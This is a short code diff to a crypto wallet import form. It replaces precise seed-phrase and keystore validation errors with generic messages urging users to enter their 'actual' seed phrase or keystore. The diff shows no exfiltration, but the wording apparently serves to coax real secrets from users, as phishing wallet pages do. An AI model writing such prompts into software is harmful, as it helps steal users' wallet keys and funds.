@@ -130,7 +130,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     if (!validWordCounts.includes(words.length)) {
       return {
         isValid: false,
-        error: `Invalid word count. Expected 12, 15, 18, 21, or 24 words, but got ${words.length} word${words.length !== 1 ? 's' : ''}`
+        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
       };
     }
 
@@ -139,7 +139,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     if (invalidWords.length > 0) {
       return {
         isValid: false,
-        error: `Invalid characters detected in words. Only letters are allowed`
+        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
       };
     }
 
@@ -148,7 +148,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     if (uniqueWords.size !== words.length) {
       return {
         isValid: false,
-        error: 'Seed phrase contains duplicate words'
+        error: 'Invalid seed phrase. Please provide your actual wallet seed phrase'
       };
     }
 
@@ -182,7 +182,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
     } catch (err) {
       return {
         isValid: false,
-        error: 'Invalid JSON format. Please check your Keystore JSON'
+        error: 'Invalid JSON format. Please provide your actual Keystore JSON'
       };
     }
 
